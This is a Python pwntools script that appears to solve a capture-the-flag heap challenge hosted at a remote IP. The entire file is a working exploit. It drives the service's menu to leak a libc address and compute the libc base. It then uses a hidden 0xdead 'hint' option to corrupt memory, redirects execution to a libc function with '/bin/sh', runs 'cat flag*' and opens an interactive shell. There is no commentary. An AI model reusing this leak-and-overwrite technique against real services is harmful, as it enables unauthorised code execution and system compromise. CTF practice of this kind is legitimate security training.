#!/usr/bin/env python3

from pwn import *

r = remote("124.70.137.88", 30000)

def sl(data):
    r.sendlineafter(": ", data)

def s(data):
    r.sendlineafter(": ", data)


def alloc(index, size):
    print("alloc ", index)
    sl("1")
    sl(str(index))
    sl(str(size))

def show(index):
    sl("3")
    sl(str(index))

i = 0
def hint(addr):
    global i
    print("hint " + str(i))
    sl(str(0xdead))
    s(p32(0x2f767991) + p32(0)*3)
    sl(str(addr))
    i += 1

def hint_d(data):
    sl(str(0xdead))
    s(data)

def fill(index, content):
    sl("4")
    sl(str(index))
    s(content)

def main():
    
    alloc(0, 0x100)
    hint_d(b"M"*0x800)
    
    alloc(1, 0x400)
    show(1)
    leak = u64(r.recv(8))
    log.info("Libc Leak @ 0x%x", leak)

    libc_base = leak - 0x3ebca0

    bss = libc_base + 0x3eb000
    
    for i in range(33):
        hint(bss + 0x8 + 2)
    
    for i in range(0x20+1):
        hint(bss + 0x8 + 1)

    alloc(3, 0x48)
    fill(3, p64(bss)*4)

    fill(0x18a, p8(0)*0x108 + p64(libc_base + 0x4f550))
    hint_d(b"/bin/sh\x00"*0x50)
    r.sendline("cat flag*")

    r.interactive()


if __name__ == "__main__":
    main()
